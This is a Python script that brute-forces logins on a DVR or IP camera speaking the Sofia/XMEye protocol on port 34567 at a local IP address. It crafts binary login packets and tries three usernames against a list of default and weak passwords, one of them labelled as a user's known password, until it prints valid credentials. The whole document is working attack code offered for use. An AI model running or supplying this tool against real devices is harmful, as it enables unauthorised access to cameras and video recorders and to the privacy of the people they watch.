
import socket
import struct
import json
import time

TARGET_IP = "192.168.3.27"
PORT = 34567

# Protocol Specs
HEAD_MAGIC = 0xff
VERSION = 1
CMD_LOGIN_REQ = 1000
CMD_LOGIN_RES = 1001

PASSWORDS_TO_TRY = [
    "",             # Empty
    "admin",        # User matches pass
    "123456",       # Common
    "12345", 
    "123456789",
    "viguera2001",  # User's known pass
    "berbert",
    "888888",
    "666666",
    "password",
    "default",
    "xmeye",
    "icsee"
]

USERS = ["admin", "default", "system"]

def make_login_packet(user, password, session_id=0, seq=0):
    login_data = {
        "EncryptType": "MD5", # Try MD5 first, sometimes plain works too or "NONE"
        "LoginType": "TreeView",
        "PassWord": password,
        "UserName": user,
        "Name": "PythonClient"
    }
    
    # Try sending password as MD5 hash if plain fails? 
    # Usually 'MD5' type implies the client sends the raw string and the device hashes, 
    # OR the client must hash it. 
    # Let's try sending plain text first as 'MD5' is often just a label in the JSON.
    # Actually, many clients send plain text and set EncryptType to 'MD5'.
    
    json_str = json.dumps(login_data)
    data_bytes = json_str.encode('utf-8')
    total_len = len(data_bytes) + 24
    
    # Head(1), Ver(1), Res(2), Sess(4), Seq(4), TotLen(4), CurLen(4), MsgID(2), Res(1), Enc(1)
    header = struct.pack("<BBHIIIIHBB", 
                         HEAD_MAGIC, VERSION, 0, 
                         session_id, seq, 
                         total_len, len(data_bytes), 
                         CMD_LOGIN_REQ, 0, 0)
    return header + data_bytes

def try_login(user, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2.0)
    try:
        s.connect((TARGET_IP, PORT))
        packet = make_login_packet(user, password)
        s.sendall(packet)
        
        # Read Header
        head_buf = s.recv(24)
        if len(head_buf) < 24: return False, "No Header"
        
        _, _, _, sess, _, _, cur_len, msg_id, _, _ = struct.unpack("<BBHIIIIHBB", head_buf)
        
        if cur_len > 0:
            payload = s.recv(cur_len)
            try:
                resp = json.loads(payload)
                ret_code = resp.get("Ret")
                # Ret 100 = OK
                # Ret 102 = Bad Password
                # Ret 101/Other = User not found or Locked
                return (ret_code == 100), f"Ret: {ret_code}"
            except:
                return False, "Bad JSON"
                
        return False, "No Payload"
        
    except Exception as e:
        return False, str(e)
    finally:
        s.close()

def main():
    print(f"Cracking Sofia Protocol on {TARGET_IP}:{PORT}...")
    
    for user in USERS:
        print(f"\n--- Testing User: {user} ---")
        for pwd in PASSWORDS_TO_TRY:
            print(f"Trying '{user}' / '{pwd}' ... ", end="")
            success, msg = try_login(user, pwd)
            if success:
                print("SUCCESS!")
                print(f"!!! FOUND VALID CREDENTIALS !!!")
                print(f"User: {user}")
                print(f"Pass: {pwd}")
                return
            else:
                print(f"Fail ({msg})")
                time.sleep(0.1) # Avoid flooding
                
    print("\nSearch Complete. No credentials worked.")

if __name__ == "__main__":
    main()
